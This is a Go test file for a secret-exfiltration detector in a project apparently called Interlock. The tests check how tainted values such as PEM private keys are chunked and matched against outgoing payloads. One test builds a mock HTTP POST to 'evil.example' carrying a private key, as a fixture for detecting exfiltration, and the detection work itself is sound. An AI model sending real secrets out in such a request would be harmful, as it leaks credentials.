package engine

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/yxshwanth/Interlock/internal/model"
)

func TestContiguousChunks_MinLenGate(t *testing.T) {
	short := strings.Repeat("a", 63)
	if got := ContiguousChunks(short, 32, 64); got != nil {
		t.Fatalf("expected nil for len<minLen, got %d chunks", len(got))
	}
}

func TestContiguousChunks_NonOverlapping(t *testing.T) {
	val := strings.Repeat("0123456789abcdef", 8) // 128 bytes
	chunks := ContiguousChunks(val, 32, 64)
	if len(chunks) != 4 {
		t.Fatalf("got %d chunks, want 4", len(chunks))
	}
	for i, ch := range chunks {
		if ch.Form != "chunk_32" {
			t.Errorf("chunk[%d].Form = %q, want chunk_32", i, ch.Form)
		}
		if len(ch.Value) != 32 {
			t.Errorf("chunk[%d] len = %d, want 32", i, len(ch.Value))
		}
		if ch.Value != val[i*32:(i+1)*32] {
			t.Errorf("chunk[%d] misaligned", i)
		}
	}
}

func TestContiguousChunks_PEMSkipsHeader(t *testing.T) {
	pem := "-----BEGIN PRIVATE KEY-----\n" +
		strings.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcd\n", 4) +
		"-----END PRIVATE KEY-----\n"
	chunks := ContiguousChunks(pem, 32, 64)
	if len(chunks) == 0 {
		t.Fatal("expected chunks from PEM body")
	}
	for _, ch := range chunks {
		if strings.Contains(ch.Value, "BEGIN") || strings.Contains(ch.Value, "END") {
			t.Fatalf("chunk must not include PEM armor: %q", ch.Value)
		}
		if strings.Contains(ch.Value, "-----") {
			t.Fatalf("chunk must not include dashes: %q", ch.Value)
		}
	}
}

func TestCheckOverlap_LongSecretChunkMatch(t *testing.T) {
	secret := strings.Repeat("UNIQUE_LONG_SECRET_BODY_BYTES!!", 4) // 128 bytes
	tv := model.TaintedValue{
		Value:   secret,
		Hash:    "h-long",
		Preview: "p",
	}
	AttachChunks(&tv, 32, 64)
	if len(tv.Chunks) == 0 {
		t.Fatal("expected chunks")
	}
	// Truncated haystack: only middle 40 bytes of the secret (covers one full chunk).
	excerpt := "prefix|" + secret[32:64] + "|suffix"
	hit := CheckOverlap([]model.TaintedValue{tv}, json.RawMessage(`{"body":`+mustJSONString(excerpt)+`}`))
	if hit == nil {
		t.Fatal("expected chunk overlap hit")
	}
	if hit.MatchForm != "chunk_32" {
		t.Fatalf("MatchForm = %q, want chunk_32", hit.MatchForm)
	}
	if hit.TaintedHash != "h-long" {
		t.Fatalf("hash = %q", hit.TaintedHash)
	}
}

func TestCheckOverlap_ChunkUnrelated32_NoHit(t *testing.T) {
	secret := strings.Repeat("AAAA_TAINTED_LONG_VALUE_BYTES!!", 4)
	tv := model.TaintedValue{Value: secret, Hash: "h", Preview: "p"}
	AttachChunks(&tv, 32, 64)
	unrelated := "BBBB_UNRELATED_BLOB_BYTES_XXXX!!" // exactly 32 bytes; not a substring of secret
	if len(unrelated) != 32 {
		t.Fatalf("unrelated len = %d, want 32", len(unrelated))
	}
	hit := CheckOverlap([]model.TaintedValue{tv}, json.RawMessage(`{"body":`+mustJSONString(unrelated)+`}`))
	if hit != nil {
		t.Fatalf("unrelated 32-byte blob must not EXFIL, got %+v", hit)
	}
}

func TestCheckOverlap_PEMHeaderAlone_NoChunkExfil(t *testing.T) {
	pem := "-----BEGIN PRIVATE KEY-----\n" +
		strings.Repeat("MIIEvQIBADANBgkqhkiG9w0BAQEFAASc\n", 8) +
		"-----END PRIVATE KEY-----\n"
	tv := model.TaintedValue{Value: pem, Hash: "h-pem", Preview: "p"}
	AttachChunks(&tv, 32, 64)
	args := json.RawMessage(`{"body":"docs say use -----BEGIN PRIVATE KEY----- for PKCS8"}`)
	hit := CheckOverlap([]model.TaintedValue{tv}, args)
	if hit != nil {
		t.Fatalf("PEM header alone must not chunk-EXFIL, got %+v", hit)
	}
}

func TestCheckOverlapPayload_PEMChunkInTruncatedExcerpt(t *testing.T) {
	pem := "-----BEGIN PRIVATE KEY-----\n" +
		strings.Repeat("MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj\n", 26) +
		"-----END PRIVATE KEY-----\n"
	tv := model.TaintedValue{
		Value:    pem,
		Variants: CanonicalEncodings(pem),
		Hash:     HashValue(pem),
		Preview:  MaskValue(pem),
	}
	AttachChunks(&tv, 32, 64)
	if len(tv.Chunks) == 0 {
		t.Fatal("expected PEM body chunks")
	}
	prefix := "POST /collect HTTP/1.1\r\nHost: evil.example\r\n\r\n"
	excerpt := prefix + pem
	if len(excerpt) > 512 {
		excerpt = excerpt[:512]
	}
	hit := CheckOverlapPayload([]model.TaintedValue{tv}, excerpt)
	if hit == nil {
		t.Fatal("truncated PEM excerpt with body bytes must EXFIL via chunk")
	}
	if hit.MatchForm != "chunk_32" {
		t.Fatalf("MatchForm = %q, want chunk_32", hit.MatchForm)
	}
	if hit.WhereFound != "egress payload" {
		t.Fatalf("WhereFound = %q", hit.WhereFound)
	}
}
